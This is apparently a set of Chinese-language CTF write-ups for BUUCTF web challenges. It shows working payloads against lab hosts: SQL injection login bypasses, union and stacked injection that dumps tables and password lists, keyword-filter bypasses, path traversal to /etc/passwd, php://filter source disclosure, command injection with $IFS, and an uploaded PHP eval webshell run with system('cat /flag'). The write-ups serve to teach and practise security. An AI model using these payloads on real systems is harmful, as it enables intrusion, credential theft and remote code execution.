## [极客大挑战 2019]EasySQL

试一下就可以发现后台是 select * from users where username='$_GET[username]' and password='$_GET[passwd]'

万能密码登录，得到flag。

万能密码：

username='=‘&password='='

username=\&password=='

username='=''%23&password=1

![image-20230407232743248](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072327474.png)

## [极客大挑战 2019]Havefun

页面源码中有提示：

![image-20230407234234243](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072342273.png)

![image-20230407234530855](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072345875.png)

## [HCTF 2018]WarmUp

页面源码有提示：

![image-20230407235057514](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072350537.png)

得到页面源码：

```
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

![img](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304072353687.jpg)

源码中的白名单包括源码本身source.php和提示hint.php

hint.php：

flag not here, and flag in ffffllllaaaagggg

checkfile函数匹配包含文件白名单时先截取第一个问号前面的部分，构造source.php?/../../../../etc/passwd 可绕过文件名白名单。

![image-20230408001126427](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080011452.png)

![image-20230408003711699](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080037719.png)

## [ACTF2020 新生赛]Include

页面源码有提示：

![image-20230408003842849](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080038880.png)

用php伪协议将源码base64编码后输出到页面，再解码得到flag：

![image-20230408004053914](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080040936.png)

![image-20230408004144458](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080041480.png)

## [ACTF2020 新生赛]Exec

没有任何过滤的命令执行：

![image-20230408005147373](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080051400.png)

## [强网杯 2019]随便注

select被禁用

![image-20230408005815607](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080058627.png)

可以用万能密码查看所有记录：

![image-20230408010338262](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080103284.png)

可以堆叠注入：

![image-20230408010823824](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080108854.png)

大概可看出，flag在表1919810931114514中，页面默认查询的是表words。

由于select被禁用，考虑将1919810931114514改名为words，将flag显示在页面上。

首先将字段名flag改为id【不必拘泥于words表中的两个字段id和data，只有一个字段id也可以利用万能密码全部显示】

 ![image-20230408011715800](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080117826.png)

然后修改words表名的同时修改1919810931114514表名为words【改错就挂了】

```
f8ce56a6-4000-48e2-878e-c58319474118.node4.buuoj.cn:81/?inject=1';rename table words to x;rename table `1919810931114514` to words;
```

万能密码显示flag：

![image-20230408012722784](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080127819.png)

## [GXYCTF2019]Ping Ping Ping

貌似是个正则匹配，类似f.\*l.\*a.*g，需要改变字母顺序才能绕过：

```
http://8535bb82-f8c2-409e-9e0c-60645b38280f.node4.buuoj.cn:81/?ip=127.0.0.1;a=g.php;b=fla;cat$IFS$b$a;
```

![image-20230408014252555](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080142587.png)

## [SUCTF 2019]EasySQL

输入非零数字返回1，其他无回显。推断输入值被做了布尔运算，然后直接输出到页面。可控字符在from左边。

![image-20230408095854277](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304080958324.png)

可以堆叠注入：

```
query=1;show tables;
```

当前数据库只有一个表Flag，但from、flag被禁用。

直接用逗号分隔，*号输出表中所有字段，得到flag：

```
query=1;select *,1
```

![image-20230408111728488](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081123818.png)

方法二：

布尔运算无非是与或非，猜测后面的值与flag有关，字母开头转换为数值0，根据非零输入返回1可猜测运算符为|，可修改其功能为字符串拼接，从而输出后面的字符串到页面。

```
query=1;set sql_mode=pipes_as_concat;select 1
```

![image-20230408112252130](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081122154.png)

## [极客大挑战 2019]Secret File

源码中找到url，点进去还有url，再点就结束了。用burp抓包，发现中间有个302跳转，跳转前的页面里有文件名提示，访问看到页面源码。

![image-20230408122856225](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081228250.png)

```
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

直接用php伪协议查看flag.php源码，得到flag：

```
http://6d79b680-20d9-4441-b583-bd2263130be7.node4.buuoj.cn:81/secr3t.php?file=php://filter/read/convert.base64-encode/resource=flag.php
```

![image-20230408123605863](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081236885.png)

## [极客大挑战 2019]LoveSQL

万能密码登录：

![image-20230408124207445](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081242479.png)

页面给了密码密文，然而并没有什么用。

但是这里要考虑一下为什么密码会输出到页面上，一种情况是验证成功后又查询了一次密码；另一种情况是验证的同时查询到了密码。重点考虑后者。

```
Select * from xxx where username=$_GET[username] and password=$_GET[password]
```

尝试联合查询注入：

```
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=admin&password=81223ef680e39547560b1354d2af3d58'order by 4%23
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,3%23
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,group_concat(table_name,0x2b,column_name)from information_schema.columns where table_schema=database()%23
#'geekuser+id,geekuser+username,geekuser+password,l0ve1ysq1+id,l0ve1ysq1+username,l0ve1ysq1+password'
http://13a1beee-f30d-46b2-aa63-00bfd9d35b5f.node4.buuoj.cn:81/check.php?username=1&password='union select 1,2,group_concat(password)from l0ve1ysq1%23
#Your password is 'wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag{e0d35709-ea21-4072-bc4b-a5d91c0d1737}'
```

## [极客大挑战 2019]Http

在页面源码中找到提示：

![image-20230408125923174](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081259207.png)

按提示修改Referer、UserAgent、X-Forwarded-For，得到flag：

![image-20230408130257715](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081302735.png)

## [极客大挑战 2019]Knife

# 我家菜刀丢了，你能帮我找一下么

eval($_POST["Syc"]);

这也没丢啊，都直接给说密码了，后门也就在index.php里。蚁剑连接，在根目录看到flag文件。

![image-20230408132803658](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081328680.png)

## [极客大挑战 2019]Upload

随便上传一个图片，竟然报错：

```
 NO! HACKER! your file included '<?' 
```

可见后台对图片内容过滤了 <? 而我用Photoshop生成的图片里面自带很多xml格式的信息，所以被误伤了。用Photoshop生成图片时元数据为“无”即可消除这些信息。

考虑用以下一句话木马绕过：

```
<script language="php">@eval($_POST[c]);</script>
```

简单尝试几次，发现可以上传phtml文件

![image-20230408135143890](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081351915.png)

```
http://ea10f465-71e7-43c6-a16b-ca214555a6f7.node4.buuoj.cn:81/upload/logo.phtml
c=phpinfo();
```

一句话木马执行成功！

```
c=system('cat /flag');
```

直接看到flag，或者用蚁剑翻目录。

## [ACTF2020 新生赛]Upload

可以上传pht文件：

![image-20230408135750684](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081357710.png)

但不解析。上传phtml文件可解析。

![image-20230408135940071](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202304081417348.png)

## [极客大挑战 2019]BabySQL

Union、select、or被删除，可以双写绕过。

```
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username=admin'oorrder bory 4%23&password=123456
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,3%23&password=123456
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,group_concat(table_name,0x2b,column_name)frorom infoorrmation_schema.columns wheorre table_schema=database()%23&password=123456
#Your password is 'b4bsql+id,b4bsql+username,b4bsql+password,geekuser+id,geekuser+username,geekuser+password'
http://570a4fdd-6564-42af-be03-8830c3bbaad8.node4.buuoj.cn:81/check.php?username='unioron seorlect 1,2,group_concat(passwoorrd)frorom b4bsql%23&password=123456
#Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{b9531139-550b-423c-ab4c-14527649d576}'
```

